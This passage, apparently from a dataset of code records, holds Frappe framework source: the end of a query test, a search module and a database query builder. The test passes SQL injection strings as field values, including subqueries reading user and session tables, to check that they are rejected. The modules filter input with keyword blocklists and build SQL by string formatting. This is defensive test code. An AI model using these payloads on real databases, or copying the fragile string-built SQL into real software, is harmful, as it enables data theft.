create_event(starts_on=\"2016-07-08 00:00:01\")\n\n\t\t# if the values are not passed in filters then event should be filter as current datetime\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", None]}, fields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\n\t\t# if both from and to_date values are passed\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-06\", \"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event2.name } in data)\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event4.name } not in data)\n\n\t\t# if only one value is passed in the filter\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event4.name } in data)\n\t\tself.assertTrue({ \"name\": todays_event.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event2.name } not in data)\n\n\tdef test_ignore_permissions_for_get_filters_cond(self):\n\t\tfrappe.set_user('test1@example.com')\n\t\tself.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])\n\t\tself.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))\n\t\tfrappe.set_user('Administrator')\n\n\tdef test_query_fields_sanitizer(self):\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\t\tfields=[\"name\", \"issingle, version()\"], limit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (select name from tabUser), count(name))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, (select count(*) from tabSessions)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (SELECT name from tabUser), count(*))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"count(name)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('count(name)' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"locate('', name) as _relevance\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('_relevance' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"date(creation) as creation\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('creation' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\",\n\t\t\t\"datediff(modified, creation) as date_diff\"], limit_start=0, limit_page_length=1)\n\t\tself.assertTrue('date_diff' in data[0])\n\ndef create_event(subject=\"_Test Event\", starts_on=None):\n\t\"\"\" create a test event \"\"\"\n\n\tfrom frappe.utils import get_datetime\n\n\tevent = frappe.get_doc({\n\t\t\"doctype\": \"Event\",\n\t\t\"subject\": subject,\n\t\t\"event_type\": \"Public\",\n\t\t\"starts_on\": get_datetime(starts_on),\n\t}).insert(ignore_permissions=True)\n\n\treturn event",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vhrspvl/hd-frappe/blob/8ad60a25b9d382c2b0ee7c78f1dd118e2d18066b",
        "file_path": "/frappe/desk/search.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\n# Search\nfrom __future__ import unicode_literals\nimport frappe, json\nfrom frappe.utils import cstr, unique\nfrom frappe import _\nfrom six import string_types\n\n\ndef sanitize_searchfield(searchfield):\n\tblacklisted_keywords = ['select', 'delete', 'drop', 'update', 'case', 'and', 'or', 'like']\n\n\tdef _raise_exception():\n\t\tfrappe.throw(_('Invalid Search Field'), frappe.DataError)\n\n\tif len(searchfield) >= 3:\n\n\t\t# to avoid 1=1\n\t\tif '=' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# in mysql -- is used for commenting the query\n\t\telif ' --' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# to avoid and, or and like\n\t\telif any(' {0} '.format(keyword) in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n\t\t# to avoid select, delete, drop, update and case\n\t\telif any(keyword in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n# this is called by the Link Field\n@frappe.whitelist()\ndef search_link(doctype, txt, query=None, filters=None, page_length=20, searchfield=None):\n\tsearch_widget(doctype, txt, query, searchfield=searchfield, page_length=page_length, filters=filters)\n\tfrappe.response['results'] = build_for_autosuggest(frappe.response[\"values\"])\n\tdel frappe.response[\"values\"]\n\n# this is called by the search box\n@frappe.whitelist()\ndef search_widget(doctype, txt, query=None, searchfield=None, start=0,\n\tpage_length=10, filters=None, filter_fields=None, as_dict=False):\n\tif isinstance(filters, string_types):\n\t\tfilters = json.loads(filters)\n\n\tmeta = frappe.get_meta(doctype)\n\n\tif searchfield:\n\t\tsanitize_searchfield(searchfield)\n\n\tif not searchfield:\n\t\tsearchfield = \"name\"\n\n\tstandard_queries = frappe.get_hooks().standard_queries or {}\n\n\tif query and query.split()[0].lower()!=\"select\":\n\t\t# by method\n\t\tfrappe.response[\"values\"] = frappe.call(query, doctype, txt,\n\t\t\tsearchfield, start, page_length, filters, as_dict=as_dict)\n\telif not query and doctype in standard_queries:\n\t\t# from standard queries\n\t\tsearch_widget(doctype, txt, standard_queries[doctype][0],\n\t\t\tsearchfield, start, page_length, filters)\n\telse:\n\t\tif query:\n\t\t\tfrappe.throw(_(\"This query style is discontinued\"))\n\t\t\t# custom query\n\t\t\t# frappe.response[\"values\"] = frappe.db.sql(scrub_custom_query(query, searchfield, txt))\n\t\telse:\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfilters_items = filters.items()\n\t\t\t\tfilters = []\n\t\t\t\tfor f in filters_items:\n\t\t\t\t\tif isinstance(f[1], (list, tuple)):\n\t\t\t\t\t\tfilters.append([doctype, f[0], f[1][0], f[1][1]])\n\t\t\t\t\telse:\n\t\t\t\t\t\tfilters.append([doctype, f[0], \"=\", f[1]])\n\n\t\t\tif filters==None:\n\t\t\t\tfilters = []\n\t\t\tor_filters = []\n\n\n\t\t\t# build from doctype\n\t\t\tif txt:\n\t\t\t\tsearch_fields = [\"name\"]\n\t\t\t\tif meta.title_field:\n\t\t\t\t\tsearch_fields.append(meta.title_field)\n\n\t\t\t\tif meta.search_fields:\n\t\t\t\t\tsearch_fields.extend(meta.get_search_fields())\n\n\t\t\t\tfor f in search_fields:\n\t\t\t\t\tfmeta = meta.get_field(f.strip())\n\t\t\t\t\tif f == \"name\" or (fmeta and fmeta.fieldtype in [\"Data\", \"Text\", \"Small Text\", \"Long Text\",\n\t\t\t\t\t\t\"Link\", \"Select\", \"Read Only\", \"Text Editor\"]):\n\t\t\t\t\t\t\tor_filters.append([doctype, f.strip(), \"like\", \"%{0}%\".format(txt)])\n\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"enabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"enabled\", \"=\", 1])\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"disabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"disabled\", \"!=\", 1])\n\n\t\t\t# format a list of fields combining search fields and filter fields\n\t\t\tfields = get_std_fields_list(meta, searchfield or \"name\")\n\t\t\tif filter_fields:\n\t\t\t\tfields = list(set(fields + json.loads(filter_fields)))\n\t\t\tformatted_fields = ['`tab%s`.`%s`' % (meta.name, f.strip()) for f in fields]\n\n\t\t\t# find relevance as location of search term from the beginning of string `name`. used for sorting results.\n\t\t\tformatted_fields.append(\"\"\"locate(\"{_txt}\", `tab{doctype}`.`name`) as `_relevance`\"\"\".format(\n\t\t\t\t_txt=frappe.db.escape((txt or \"\").replace(\"%\", \"\")), doctype=frappe.db.escape(doctype)))\n\n\n\t\t\t# In order_by, `idx` gets second priority, because it stores link count\n\t\t\tfrom frappe.model.db_query import get_order_by\n\t\t\torder_by_based_on_meta = get_order_by(doctype, meta)\n\t\t\torder_by = \"if(_relevance, _relevance, 99999), `tab{0}`.idx desc, {1}\".format(doctype, order_by_based_on_meta)\n\n\t\t\tvalues = frappe.get_list(doctype,\n\t\t\t\tfilters=filters, fields=formatted_fields,\n\t\t\t\tor_filters = or_filters, limit_start = start,\n\t\t\t\tlimit_page_length=page_length,\n\t\t\t\torder_by=order_by,\n\t\t\t\tignore_permissions = True if doctype == \"DocType\" else False, # for dynamic links\n\t\t\t\tas_list=not as_dict)\n\n\t\t\t# remove _relevance from results\n\t\t\tif as_dict:\n\t\t\t\tfor r in values:\n\t\t\t\t\tr.pop(\"_relevance\")\n\t\t\t\tfrappe.response[\"values\"] = values\n\t\t\telse:\n\t\t\t\tfrappe.response[\"values\"] = [r[:-1] for r in values]\n\ndef get_std_fields_list(meta, key):\n\t# get additional search fields\n\tsflist = meta.search_fields and meta.search_fields.split(\",\") or []\n\ttitle_field = [meta.title_field] if (meta.title_field and meta.title_field not in sflist) else []\n\tsflist = ['name'] + sflist + title_field\n\tif not key in sflist:\n\t\tsflist = sflist + [key]\n\n\treturn sflist\n\ndef build_for_autosuggest(res):\n\tresults = []\n\tfor r in res:\n\t\tout = {\"value\": r[0], \"description\": \", \".join(unique(cstr(d) for d in r if d)[1:])}\n\t\tresults.append(out)\n\treturn results\n\ndef scrub_custom_query(query, key, txt):\n\tif '%(key)s' in query:\n\t\tquery = query.replace('%(key)s', key)\n\tif '%s' in query:\n\t\tquery = query.replace('%s', ((txt or '') + '%'))\n\treturn query\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vhrspvl/hd-frappe/blob/acd190cf9ec5b351177c69d37f02468521e4ab6c",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in 